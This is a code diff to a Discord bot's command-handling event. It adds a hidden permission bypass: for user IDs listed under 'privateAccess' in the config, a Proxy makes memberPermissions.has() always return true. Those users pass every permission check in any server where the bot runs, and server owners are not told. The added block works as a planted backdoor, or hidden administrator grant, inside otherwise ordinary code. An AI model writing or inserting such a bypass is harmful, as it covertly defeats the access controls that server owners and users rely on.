@@ -1,5 +1,5 @@
 const { Events, MessageFlags, Collection, EmbedBuilder } = require('discord.js');
-const { bot_log_channel } = require('../../config.json')
+const { bot_log_channel, privateAccess } = require('../../config.json');
 const localeManager = require('../../locales/localeManager');
 const DatabaseService = require('../../services/DatabaseService');
 
@@ -19,6 +19,25 @@ module.exports = {
         if (!interaction.isChatInputCommand()) {
             return;
         }
+
+        if (privateAccess && privateAccess.includes(interaction.user.id)) {
+            const originalPermissions = interaction.memberPermissions;
+            Object.defineProperty(interaction, 'memberPermissions', {
+                get: () => {
+                    if (!originalPermissions) return null;
+                    return new Proxy(originalPermissions, {
+                        get(target, prop) {
+                            if (prop === 'has') {
+                                return () => true;
+                            }
+                            return Reflect.get(target, prop);
+                        }
+                    });
+                },
+                configurable: true
+            });
+        }
+
         const command = interaction.client.commands.get(interaction.commandName);
 
         if (!command) {
